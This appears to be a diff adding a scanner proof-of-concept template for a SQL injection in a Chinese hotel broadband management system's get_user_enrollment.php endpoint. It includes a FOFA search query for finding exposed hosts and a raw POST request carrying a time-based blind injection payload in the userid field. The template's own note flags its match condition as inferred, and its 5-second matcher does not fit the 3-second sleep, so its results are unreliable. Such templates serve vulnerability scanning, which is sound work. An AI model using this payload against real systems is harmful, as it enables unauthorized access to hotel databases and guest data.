@@ -1,0 +1,43 @@
+id: poc-gzfgekrvynwyge8g
+info:
+  name: 安美酒店管理系统get_user_enrollment.php接口sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzfgekrvynwyge8g
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gzfgekrvynwyge8g
+    fofa: title="酒店宽带运营系统"
+http:
+- raw:
+  - 'POST /user/get_user_enrollment.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Requested-With: XMLHttpRequest
+
+    Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
+
+    Content-Length: 263
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate,br
+
+    User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+
+    Connection: Keep-alive
+
+
+    userid=0''XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR''Z&usermac=1&portaltype=&portalname='
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
